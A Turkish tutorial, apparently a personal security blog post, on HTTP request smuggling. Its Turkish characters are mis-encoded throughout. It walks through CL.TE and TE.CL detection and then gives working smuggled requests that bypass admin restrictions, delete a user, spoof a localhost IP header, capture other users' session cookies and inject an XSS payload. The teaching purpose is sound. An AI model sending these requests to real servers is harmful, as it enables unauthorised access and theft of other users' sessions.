I"Şe<p>HTTP istek kaÃ§akÃ§Ä±lÄ±ÄŸÄ± olarak TÃ¼rkÃ§eâ€™ye Ã§evirebileceÄŸimiz HTTP Request Smuggling aÃ§Ä±ÄŸÄ±, sunucuda kullanÄ±lan front-end ve back-end sistemlerinin senkronize bir ÅŸekilde Ã§alÄ±ÅŸmamasÄ±ndan kaynaklanÄ±r. GÃ¼nÃ¼mÃ¼zde Ã§oÄŸu sunucu zincirleme bir sisteme sahip. Bu zincirleme sistemlerin birbiri ile optimize bir ÅŸekilde Ã§alÄ±ÅŸmasÄ± iÃ§in Ã¶zenle yapÄ±landÄ±rmak gerek. Ancak her ne kadar dikkat edilmeye Ã§alÄ±ÅŸÄ±lsa da bazen gÃ¶zden kaÃ§an noktalar olabiliyor. HTTP Request Smuggling de bu noktalardan birisi.</p>

<p>Bu aÃ§Ä±ÄŸÄ± incelemeye geÃ§meden Ã¶nce istek yapÄ±sÄ±nÄ± bilmeliyiz. Ã–rneÄŸin benim sitemin anasayfasÄ±na girmek istediÄŸinizde tarayÄ±cÄ±nÄ±z aÅŸaÄŸÄ±dakine benzer bir istek gÃ¶nderecektir:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    GET / HTTP/1.1
    Host: fatihfurkan.site
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    DNT: 1
    Connection: close
    Upgrade-Insecure-Requests: 1
</code></pre></div></div>

<p>KÄ±sa bir ÅŸekilde hemen isteÄŸimizi inceleyelim. Ä°lk satÄ±rda isteÄŸimizin HTTP GET metodunu kullandÄ±ÄŸÄ±nÄ±z anlÄ±yoruz. EÄŸer HTTP metodlarÄ±nÄ± bilmiyorsanÄ±z Ã¶ÄŸrenmelisiniz. <a href="https://www.w3schools.com/tags/ref_httpmethods.asp">Buraya</a> bir kaynak bÄ±raktÄ±m. GET metodumuzun yanÄ±nda gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z â€œ/â€ iÅŸareti, sitenin kÃ¶k dizinini gÃ¶rÃ¼ntÃ¼lemek istediÄŸimizi ifade eder. Ä°lk satÄ±rÄ±n sonundaki â€œHTTP/1.1â€ ise, kullandÄ±ÄŸÄ±mÄ±z HTTP versiyonunu gÃ¶sterir. DiÄŸer ifadeleri ise kÄ±saca aÃ§Ä±klamak gerekirse:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    GET / HTTP/1.1
    Host: Hedef site
    User-Agent: TarayÄ±cÄ±nÄ±z ve bilgiyasarÄ±nÄ±z hakkÄ±nda bilgi
    Accept: Kabul edilecek dosya tÃ¼rleri
    Accept-Language: Tercih edilen doÄŸal dil kÃ¼mesi
    Accept-Encoding: Kabul edilebilir iÃ§erik kodlarÄ±
    DNT: Do Not Track (0 kapalÄ±, 1 aÃ§Ä±k)
    Connection: BaÄŸlantÄ± tÃ¼rÃ¼
    Upgrade-Insecure-Requests: ÅifrelenmiÅŸ ve kimliÄŸi doÄŸrulanmÄ±ÅŸ yanÄ±tlar iÃ§in
</code></pre></div></div>

<p>Herhangi bir girdi gÃ¶ndermediÄŸimizde giden yanÄ±tlar aÅŸaÄŸÄ± yukarÄ± bu biÃ§imdedir. Girdi gÃ¶nderdiÄŸimizde ise bunlara ek olarak â€˜Content-Lengthâ€™ veya â€˜Transfer-Encodingâ€™ ifadeleri kullanÄ±lÄ±r. Content-Lengthâ€™de standart olarak isteÄŸin iÃ§erisinde bulunan verinin boyutu byte cinsinden belirtilir. Transfer-Encodingâ€˜de ise istek yapÄ±sÄ±nÄ±n tÃ¼rÃ¼nÃ¼ belirtir (biz bu konuda sadece chunked tÃ¼rÃ¼ ile ilgileneceÄŸiz). AÅŸaÄŸÄ±da CL ve TE iÃ§in ayrÄ± ayrÄ± istek Ã¶rnekleri gÃ¶rÃ¼yorsunuz:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      POST /search HTTP/1.1
      Host: normal-website.com
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 11

      q=smuggling
</code></pre></div></div>

<p>Burada verimizin boyutu CLâ€™de 11 olarak belirtilmiÅŸ ve verimizi tek tek sayarsak gerÃ§ekten Ã¶yle olduÄŸu gÃ¶rÃ¼lÃ¼r. Dikkat etmemiz gereken nokta, aradaki boÅŸluÄŸun sayÄ±lmayacak olmasÄ±. O boÅŸluk sadece headerâ€™Ä± ayÄ±rmak iÃ§in kullanÄ±lÄ±yor. Yani asÄ±l verimiz â€œq=smugglingâ€dir. Åimdi bu isteÄŸin TE versiyonunu inceleyelim:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      POST /search HTTP/1.1
      Host: normal-website.com
      Content-Type: application/x-www-form-urlencoded
      Transfer-Encoding: chunked

      b
      q=smuggling
      0
</code></pre></div></div>

<p>Verimizin tÃ¼rÃ¼ TEâ€™de chunked olarak belirtilmiÅŸ ve headerâ€™Ä± ayÄ±ran boÅŸluktan sonra gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z ilk ÅŸey â€œbâ€ harfi. Hexadecimal sayÄ± sisteminde â€œbâ€ nin temsil attÄ±ÄŸÄ± sayÄ±, onluk (bizim kullandÄ±ÄŸÄ±mÄ±z) sayÄ± sisteminde 11â€™i temsil eder. Yani yine â€œq=smugglingâ€ verisinin bÃ¼yÃ¼klÃ¼ÄŸÃ¼nÃ¼ byte cinsinden elde ettik. Verimizin hemen altÄ±nda ise, sÄ±fÄ±rÄ± gÃ¶rÃ¼yoruz. SÄ±fÄ±r chunked yapÄ±sÄ±nda isteÄŸimizin sona erdiÄŸini belirtiyor.</p>

<p>Temel bilgileri aldÄ±ktan sonra hadi biraz daha eÄŸlenceli kÄ±sÄ±mlara geÃ§elim.</p>

<h2 id="http-request-smuggling-aÃ§Ä±ÄŸÄ±-bulma">HTTP Request Smuggling AÃ§Ä±ÄŸÄ± bulma</h2>

<p>Ã–ncelikle, bu aÅŸama sistemden sisteme deÄŸiÅŸir. Ã‡Ã¼nkÃ¼ kimileri CL.TE Ã§alÄ±ÅŸÄ±rken, kimisi TE.CL Ã§alÄ±ÅŸÄ±r. Tabii CL.CL ve TE.TE Ã§alÄ±ÅŸan sistemler bu aÃ§Ä±ÄŸa karÅŸÄ± korumalÄ±dÄ±r.</p>

<h3 id="1-clte-sistemler">1) CL.TE Sistemler</h3>

<p>Åimdi, hedef sistemimizin front-endâ€™de CL, front-endâ€™de TE kullandÄ±ÄŸÄ±nÄ± varsayalÄ±m. Sisteme giden normal bir istek ÅŸuna benzer olur:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      POST /search HTTP/1.1
      Host: normal-website.com
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 11

      q=smuggling
</code></pre></div></div>

<h4 id="a-zaman-bazlÄ±-aÃ§Ä±k-tespiti">a) Zaman BazlÄ± AÃ§Ä±k Tespiti</h4>

<p>Åimdi bu isteÄŸi HTTP Request Smuggling aÃ§Ä±ÄŸÄ±nÄ± zaman bazlÄ± tespite gÃ¶re modifiye edelim.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      POST /search HTTP/1.1
      Host: normal-website.com
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 11
      Transfer-Encoding: chunked

      0

      G
</code></pre></div></div>

<p>Bu isteÄŸi siteye gÃ¶nderdiÄŸimizde; front-endâ€™de hata vermeden back-endâ€™e geÃ§erek, back-endâ€™de iÅŸlenecektir. Ä°steÄŸi alan back-end TEâ€™e bakÄ±p isteÄŸin chunked olduÄŸunu dÃ¼ÅŸÃ¼necek ve ona gÃ¶re hareket ederek sÄ±fÄ±rda o isteÄŸin bittiÄŸini varsayacak. Daha sonra Gâ€™yi bir sonraki isteÄŸin baÅŸÄ±na eklemeye Ã§alÄ±ÅŸacaktÄ±r. Buradaki aÃ§Ä±ÄŸÄ± farkettiniz mi? Back-end sÄ±fÄ±rdan sonraki kÄ±sÄ±mlarÄ± da iÅŸlemeye Ã§alÄ±ÅŸÄ±yor. Yani bir sonraki istek iÃ§eriÄŸi ÅŸu ÅŸekilde olacaktÄ±r:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      GPOST /search HTTP/1.1
      Host: normal-website.com
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 22

      q=Bu_sÄ±radan_bir_istek
</code></pre></div></div>

<p>YazdÄ±ÄŸÄ±mÄ±z G bir sonraki POST isteÄŸinin baÅŸÄ±na geldi. Sunucu bu durumda timeout olana kadar yanÄ±t veremeyecek, biz de burada bir HTTP Request Smuggling aÃ§Ä±ÄŸÄ± olduÄŸunu Ã¶ÄŸreneceÄŸiz.</p>

<h4 id="b-farklÄ±-iÌ‡steklerle-aÃ§Ä±k-tespiti">b) FarklÄ± Ä°steklerle AÃ§Ä±k Tespiti</h4>

<p>Peki biz G yerine baÅŸka bir ÅŸey yazsak ne olur? Mesela baÅŸka bir istek yazalÄ±m;</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      POST /search HTTP/1.1
      Host: normal-website.com
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 11
      Transfer-Encoding: chunked

      0

      GET / HTTP/1.1
      Host: fatihfurkan.site
</code></pre></div></div>

<p>Back-end burada GET metoduyla yazdÄ±ÄŸÄ±mÄ±z isteÄŸi, kendisine gelecek bir sonraki isteÄŸin baÅŸÄ±na ekler. Yani baÅŸka normal bir istek geldiÄŸinde aÅŸaÄŸÄ±dakine benzer bir ÅŸey ortaya Ã§Ä±karacak;</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      GET / HTTP/1.1
      Host: fatihfurkan.sitePOST /search HTTP/1.1
      Host: normal-website.com
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 11
      Transfer-Encoding: chunked

      0
</code></pre></div></div>

<p>BÃ¶yle bir istekte URL anlamlÄ± olmadÄ±ÄŸÄ±ndan dolayÄ± 404 HTTP hata kodu alacaÄŸÄ±z. Hata aldÄ±ÄŸÄ±mÄ±z iÃ§in de sunucunun HTTP Request Smuggling aÃ§Ä±ÄŸÄ±na zaaflÄ± olduÄŸunu Ã¶ÄŸreneceÄŸiz.</p>

<h3 id="2-tecl-sistemler">2) TE.CL Sistemler</h3>

<p>Åimdi, hedef sistemimiz front-endâ€™de TE, front-endâ€™de CL kullandÄ±ÄŸÄ±nÄ± varsayalÄ±m. Sisteme giden normal bir istek ÅŸuna benzer olur:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      POST /search HTTP/1.1
      Host: normal-website.com
      Content-Type: application/x-www-form-urlencoded
      Transfer-Encoding: chunked

      b
      q=smuggling
      0
</code></pre></div></div>

<h4 id="a-zaman-bazlÄ±-aÃ§Ä±k-tespiti-1">a) Zaman BazlÄ± AÃ§Ä±k Tespiti</h4>

<p>Sunucuya ÅŸÃ¶yle bir istek atarsak:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      POST / HTTP/1.1
      Host: vulnerable-website.com
      Transfer-Encoding: chunked
      Content-Length: 6

      0

      X
</code></pre></div></div>

<p>Front-end TE kullandÄ±ÄŸÄ± iÃ§in sÄ±fÄ±ra kadar olan kÄ±sÄ±mÄ± gÃ¶recek, sÄ±fÄ±rda isteÄŸin bittiÄŸini dÃ¼ÅŸÃ¼necektir. Back-end ise CLâ€™de 6 sayÄ±sÄ±nÄ± gÃ¶rdÃ¼ÄŸÃ¼ iÃ§in isteÄŸin geri kalanÄ±na da bakacaktÄ±r. Bu iÅŸlem gÃ¶zle gÃ¶rÃ¼lÃ¼r bir gecikmeye sebebiyet verirse, sistem bahsi geÃ§en aÃ§Ä±ÄŸa karÅŸÄ± zaaflÄ±dÄ±r.</p>

<p>NOT: EÄŸer sistem CL.TE aÃ§Ä±ÄŸÄ±na zaaflÄ± ise TE.CL denemelerimiz sunucuyla iletiÅŸim halindeki diÄŸer kullanÄ±cÄ±larÄ± da etkileyebileyebilir. Bu yÃ¼zden TE.CLâ€™den Ã¶nce CL.TE aÃ§Ä±ÄŸÄ± aramasÄ± yapmamÄ±z daha saÄŸlÄ±klÄ± olacaktÄ±r.</p>

<h4 id="b-farklÄ±-iÌ‡stek-bazlÄ±-aÃ§Ä±k-tespiti">b) FarklÄ± Ä°stek BazlÄ± AÃ§Ä±k Tespiti</h4>

<p>EÄŸer sunucuya aÅŸaÄŸÄ±daki gibi bir istek gÃ¶nderirsek;</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      POST /search HTTP/1.1
      Host: vulnerable-website.com
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 2
      Transfer-Encoding: chunked

      7c
      GET /404 HTTP/1.1
      Host: vulnerable-website.com
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 144

      x=
      0
</code></pre></div></div>

<p>Front-end TE ile Ã§alÄ±ÅŸtÄ±ÄŸÄ± iÃ§in sÄ±fÄ±ra kadar olan kÄ±smÄ± iÅŸleyecektir. Ancak back-end CL ile Ã§alÄ±ÄŸÄ±ndan Ã¶tÃ¼rÃ¼ iÃ§eriÄŸi 4 byte olarak gÃ¶recek ve sadece 2 bytelÄ±k kÄ±smÄ± iÅŸleyecektir. GÃ¶nderdiÄŸimiz istekteki 2 bytedan sonra gelenler, bir sonraki isteÄŸin baÅŸÄ±na eklenecektir. Bir sonraki istek ÅŸu ÅŸekilde algÄ±lar;</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      GET /404 HTTP/1.1
      Host: vulnerable-website.com
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 146

      x=
      0

      POST /search HTTP/1.1
      Host: vulnerable-website.com
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 11

      q=smuggling
</code></pre></div></div>

<p>Bu istek geÃ§ersiz bir URL iÃ§erdiÄŸinden Ã¶tÃ¼rÃ¼ 404 hatasÄ± alarak, hedefin HTTP Request Smuggling aÃ§Ä±ÄŸÄ±na karÅŸÄ± zaaflÄ± olduÄŸunu Ã¶ÄŸreniriz.</p>

<p>Åimdi bu yazÄ±nÄ±n en eÄŸlenceli kÄ±sma geÃ§iyoruz.</p>

<h2 id="http-request-smuggling-aÃ§Ä±ÄŸÄ±nÄ±-sÃ¶mÃ¼rme">HTTP Request Smuggling AÃ§Ä±ÄŸÄ±nÄ± SÃ¶mÃ¼rme</h2>

<p>Bu bÃ¶lÃ¼mde, amaca ve uygulamanÄ±n diÄŸer davranÄ±ÅŸlarÄ±na baÄŸlÄ± olarak HTTP Request Smuggling gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanÄ±labilecek Ã§eÅŸitli yollar aÃ§Ä±klayacaÄŸÄ±m. Aksi belirtilmediÄŸi sÃ¼rece bÃ¼tÃ¼n sistemler CL.TE olarak kullanÄ±ldÄ±ÄŸÄ± varsayÄ±lmÄ±ÅŸtÄ±r.</p>

<h3 id="front-end-gÃ¼venlik-kontrollerini-atlatmak-iÌ‡Ã§in-http-request-smuggling-kullanÄ±mÄ±">Front-end GÃ¼venlik Kontrollerini Atlatmak Ä°Ã§in HTTP Request Smuggling KullanÄ±mÄ±</h3>

<p>BazÄ± sistemler front-endâ€™de gÃ¼venlik kontrolleri yapar. YalnÄ±zca bu kontrollerden geÃ§en istekler back-endâ€™e iletilir.</p>

<p>Ã–rneÄŸin, bir sistemde belirli URLâ€™lere sadece kullanÄ±cÄ±nÄ±n yetkisi varsa ulaÅŸÄ±labilir olsun. Front-end isteÄŸi kontrol ediyor ve kontrolden geÃ§enleri back-endâ€™e iletiyor. Back-end ise, kendisine ulaÅŸan istekleri gÃ¼venilir kabul ederek direkt iÅŸliyor. Bu durumda HTTP Request Smuggling kullanÄ±larak front-end gÃ¼venlik kontrolleri atlatÄ±labilir.</p>

<p>Bir kullanÄ±cÄ±nÄ±n sistemde /homeâ€™a eriÅŸiminin olduÄŸunu ancak /adminâ€™e olmadÄ±ÄŸÄ±nÄ± varsayalÄ±m. Bu kÄ±sÄ±tlama aÅŸaÄŸÄ±daki gibi bir istek ile atlatÄ±labilir:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      POST /home HTTP/1.1
      Host: vulnerable-website.com        
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 60
      Transfer-Encoding: chunked

      0

      GET /admin HTTP/1.1
      Host: vulnerable-website.com
</code></pre></div></div>

<p>YukarÄ±daki gibi bir durumda olduÄŸumuzu dÃ¼ÅŸÃ¼nelim. Admin paneline â€œeriÅŸim saÄŸlayabiliyoruzâ€. Hadi oradan â€œfatihâ€ kullanÄ±cÄ± adÄ±na sahip kullanÄ±cÄ±yÄ± silmeye Ã§alÄ±ÅŸalÄ±m.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      POST / HTTP/1.1
      Host: vulnerable-website.com
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 37
      Transfer-Encoding: chunked

      0

      GET /admin HTTP/1.1
      X-Ignore: X
</code></pre></div></div>

<p>Ä°steÄŸini gÃ¶nderdiÄŸimizde gelen yanÄ±tta 403 Forbidden hatasÄ±nÄ± gÃ¶rÃ¼rÃ¼z. Bunun sebebi ikinci isteÄŸimizde localhostâ€™u belirtmemiÅŸ olmamÄ±zdÄ±. Hadi localhostâ€™u belirtelim.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      POST / HTTP/1.1
      Host: vulnerable-website.com
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 54
      Transfer-Encoding: chunked

      0

      GET /admin HTTP/1.1
      Host: localhost
      X-Ignore: X
</code></pre></div></div>

<p>Bu isteÄŸi gÃ¶nderdiÄŸimizde de hata alacaÄŸÄ±z. Bunun sebebi, isteklerdeki host bilgileri birbiri ile Ã§akÄ±ÅŸÄ±yor olmasÄ±.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      POST / HTTP/1.1
      Host: vulnerable-website.com
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 116
      Transfer-Encoding: chunked

      0

      GET /admin HTTP/1.1
      Host: localhost
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 10

      x=
</code></pre></div></div>

<p>Ve panele ulaÅŸtÄ±k. Åimdi biraz brute-force saldÄ±rÄ±sÄ± veya â€œiyiâ€ tahminlerle kullanÄ±cÄ±yÄ± silelim.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      POST /home HTTP/1.1
      Host: vulnerable-website.com
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 139
      Transfer-Encoding: chunked

      0

      GET /admin/delete?username=fatih HTTP/1.1
      Host: localhost
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 10

      x=
</code></pre></div></div>

<p>BaÅŸarÄ± ile kullanÄ±cÄ±mÄ±zÄ± sildik. Bu Ã¶rnek bir CL.TE Ã¶rneÄŸiydi. TE.CLâ€™de ise aÅŸaÄŸÄ±daki gibi bir Ã¶rnek kullanÄ±labilir.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      POST / HTTP/1.1
      Host: vulnerable-website.com
      Content-length: 4
      Transfer-Encoding: chunked

      87
      GET /admin/delete?username=carlos HTTP/1.1
      Host: localhost
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 15

      x=1
      0
</code></pre></div></div>

<h3 id="front-end-iÌ‡steÄŸini-yeniden-yazma">Front-end Ä°steÄŸini Yeniden Yazma</h3>

<p>GÃ¶nderdiÄŸimiz istekler Ã¶nce front-endâ€™e iletilir. Front-end isteÄŸimizi back-endâ€™e iletmeden Ã¶nce, isteÄŸe bazÄ± baÅŸlÄ±klar ekler. Ã–rneÄŸin; TLS baÄŸlantÄ±sÄ± hakkÄ±nda bazÄ± bilgiler, kullanÄ±cÄ± IPâ€™sini iÃ§eren X-Forwarded-For baÅŸlÄ±ÄŸÄ±, kullanÄ±cÄ±yÄ± tanÄ±mlayan oturum baÅŸlÄ±ÄŸÄ± vb.</p>

<p>Bu aÃ§Ä±ÄŸÄ± kullanabilmek iÃ§in Ã¶ncelikle, front-endâ€™in eklediÄŸi baÅŸlÄ±klarÄ± gÃ¶rebilmemiz gerekir. Bunun iÃ§in aÅŸaÄŸÄ±daki Ã¶rneÄŸi takip edebilirsiniz. Ã–rneÄŸimizde, sunucu CL.TE ÅŸeklinde Ã§alÄ±ÅŸÄ±yor ve sunucunun /admin dizinine sadece 127.0.0.1 IPâ€™si (localhost) ile baÄŸlanÄ±labiliyor. Ä°lk iÅŸimiz POST ile gÃ¶nderilip, yanÄ±tta da bulunan bir girdi bulmak. Bizim Ã¶rneÄŸimizde anasayfada arama girdisi var- istekte parametre ismi search olarak gÃ¶zÃ¼kÃ¼yor. Mesela test sÃ¶zcÃ¼ÄŸÃ¼nÃ¼ arattÄ±ÄŸÄ±mÄ±zda, yanÄ±tta â€œ&lt;h1&gt;1 search results for â€˜testâ€™&lt;/h1&gt;â€ ÅŸeklinde beliriyor. Åimdi, ÅŸÃ¶yle bir istek atalÄ±m:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      POST / HTTP/1.1
      Host: vulnerable-website.com
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 124
      Transfer-Encoding: chunked

      0

      POST / HTTP/1.1
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 200
      Connection: close

      search=test
</code></pre></div></div>

<p>Dikkat edin, searh parametresini en sona yazdÄ±k. Gelen yanÄ±tÄ± inceleyelim.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      "&lt;h1&gt;0 search results for 'test POST / HTTP/1.1
      X-bEByYY-Ip: xxx.xxx.xxx.xxx
      Host: vulnerable-website.com
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 125
      Transfe'&lt;/h1&gt;"
</code></pre></div></div>

<p>Bizim gÃ¶nderdiÄŸimiz istekte â€œX-bEByYY-Ipâ€ yoktu. Peki bu nereden geldi? Evet, doÄŸru cevap, front-end ekledi. Front-end, isteÄŸi gÃ¶nderenin IPâ€™sini X-bEByYY-Ip baÅŸlÄ±ÄŸÄ± ile back-endâ€™e gÃ¶steriyor. AsÄ±l olaya geliyoruz. Back-end, istek yapanÄ±n IPâ€™si 127.0.0.1 olmadÄ±kÃ§a /adminâ€™i
yasaklÄ±yor, ama biz back-endâ€™e ulaÅŸan IPâ€™yi deÄŸiÅŸtirebiliriz deÄŸil mi? Ã‡Ã¼nkÃ¼, back-endâ€™in hangi baÅŸlÄ±k ile IP kontrolÃ¼ yaptÄ±ÄŸÄ±nÄ± biliyoruz. Hadi o zaman yeni isteÄŸimizi gÃ¶nderelim.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      POST / HTTP/1.1
      Host: vulnerable-website.com
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 124
      Transfer-Encoding: chunked

      0

      POST /admin HTTP/1.1
      X-bEByYY-Ip: 127.0.0.1
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 200
      Connection: close

      x=1
</code></pre></div></div>

<p>Ve ikinci isteÄŸimizin sonucunda /admin dizinine ulaÅŸtÄ±k. Buradan sonra sizin hayal gÃ¼cÃ¼nÃ¼ze kalmÄ±ÅŸ.</p>

<p>NOT: Yeniden yazÄ±lan isteÄŸi gÃ¶rmek iÃ§in gÃ¶nderdiÄŸimiz isteÄŸin iÃ§erisindeki Content-Length, bize dÃ¶necek yanÄ±tÄ±n bÃ¼yÃ¼klÃ¼ÄŸÃ¼nÃ¼ gÃ¶sterir. EÄŸer Ã§ok kÃ¼Ã§Ã¼k bir sayÄ± girersek, yanÄ±tÄ±n bir kÄ±smÄ± gÃ¶rÃ¼nmeyecek, dÃ¶necek yanÄ±tÄ±n uzunluÄŸundan bÃ¼yÃ¼k bir sayÄ± girersek back-end sunucusu time out yaÅŸayacaktÄ±r.</p>

<h3 id="diÄŸer-kullanÄ±cÄ±larÄ±n-iÌ‡steÄŸini-yakalama">DiÄŸer KullanÄ±cÄ±larÄ±n Ä°steÄŸini Yakalama</h3>

<p>EÄŸer uygulamanÄ±n herhangi bir text verisi alma ve depolama iÅŸlevi varsa, HTTP Request Smuggling ile kullanÄ±cÄ± bilgileri Ã§alÄ±nabilir. Bu bilgiler arasÄ±nda; session, cookie, e-posta, ÅŸifre gibi siteye gÃ¶nderilmeye Ã§alÄ±ÅŸÄ±lan her ÅŸey olabilir.</p>

<p>Bir siteye aÅŸaÄŸÄ±dakine benzer bir istek gÃ¶ndererek yorum atÄ±ldÄ±ÄŸÄ±nÄ± varsayalÄ±m.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      POST /post/comment HTTP/1.1
      Host: vulnerable-website.com
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 154
      Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

      csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&amp;postId=2&amp;comment=My+comment&amp;name=Carlos+Montoya&amp;email=carlos%40normal-user.net&amp;website=https%3A%2F%2Fnormal-user.net
</code></pre></div></div>

<p>Bu sitede aÅŸaÄŸÄ±daki gibi bir istek ile kaÃ§akÃ§Ä±lÄ±k yapabiliriz.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      GET / HTTP/1.1
      Host: vulnerable-website.com
      Transfer-Encoding: chunked
      Content-Length: 324

      0

      POST /post/comment HTTP/1.1
      Host: vulnerable-website.com
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 400
      Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

      csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&amp;postId=2&amp;name=fatih&amp;email=mail%40normal-user.net&amp;website=https%3A%2F%2Fnormal-user.net&amp;comment=merhaba
</code></pre></div></div>

<p>Back-end, baÅŸka bir kullanÄ±cÄ±nÄ±n isteÄŸini ne zaman iÅŸlerse, bizim kaÃ§ak isteÄŸimizin sonuna kullanÄ±cÄ±nÄ±n isteÄŸini ekler.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      POST /post/comment HTTP/1.1
      Host: vulnerable-website.com
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 400
      Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

      csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&amp;postId=2&amp;name=fatih&amp;email=mail%40normal-user.net&amp;website=https%3A%2F%2Fnormal-user.net&amp;comment=merhabaGET / HTTP/1.1
      Host: vulnerable-website.com
      Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
      ...
</code></pre></div></div>

<p>Bu ÅŸekilde kullanÄ±cÄ±nÄ±n bazÄ± hassas bilgilerine ulaÅŸabilirsiniz. Fakat ÅŸÃ¶yle bir kÄ±sÄ±tlama var, kaÃ§ak istek tipine gÃ¶re (bizim durumumuzda url-encoded), parametre ayÄ±rÄ±cÄ±sÄ±na kadar gÃ¶sterim gerÃ§ekleÅŸir (bizim durumumuzda bu ayÄ±rÄ±cÄ± &amp;).</p>

<h3 id="reflected-xss-aÃ§Ä±ÄŸÄ±nÄ±-kullanma">Reflected XSS AÃ§Ä±ÄŸÄ±nÄ± Kullanma</h3>

<p>EÄŸer bir sistemde hem HTTP Request Smuggling hem de Reflected XSS aÃ§Ä±ÄŸÄ± varsa; uygulamanÄ±n diÄŸer kullancÄ±larÄ±nÄ± etkilemek iÃ§in bir istek kaÃ§akÃ§Ä±lÄ±ÄŸÄ± saldÄ±rÄ±sÄ± kullanabiliriz. Reflected XSSâ€™i HTTP Request Smugglingâ€™le kullanmanÄ±n, sadece Reflected XSS kullanmaya karÅŸÄ± iki Ã¼stÃ¼nlÃ¼ÄŸÃ¼ vardÄ±r; birincisi, kurban avlamanÄ±z gerekmez. Siz sadece XSS payloadÄ±nÄ± sisteme gÃ¶nderir ve baÅŸka bir kullanÄ±cÄ±nÄ±n sunucuya istek atÄ±p, saldÄ±rÄ±nÄ±zdan etkilenmesini beklersiniz. Ä°kincisi, HTTP istek baÅŸlÄ±klarÄ± gibi normal bir Reflected XSS saldÄ±rÄ±sÄ±nda, isteÄŸe baÄŸlÄ± olarak kontrol edilemeyen bÃ¶lÃ¼mlerde XSS davranÄ±ÅŸÄ±ndan yararlanmak iÃ§in kullanÄ±labilir.</p>

<p>Ã–rneÄŸin; bir uygulamanÄ±n User-Agent baÅŸlÄ±ÄŸÄ±nÄ±n Reflected XSSâ€™e karÅŸÄ± zaaflÄ± olduÄŸunu dÃ¼ÅŸÃ¼nelim. AÅŸaÄŸÄ±daki  istekle, bir sonraki kullanÄ±cÄ±nÄ±n ekranÄ±na â€œ1â€ yazÄ±sÄ±nÄ± alert ÅŸeklinde yansÄ±tabiliriz.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      POST / HTTP/1.1
      Host: vulnerable-website.com
      Content-Length: 63
      Transfer-Encoding: chunked

      0

      GET / HTTP/1.1
      User-Agent: &lt;script&gt;alert(1)&lt;/script&gt;
      Foo: X
</code></pre></div></div>

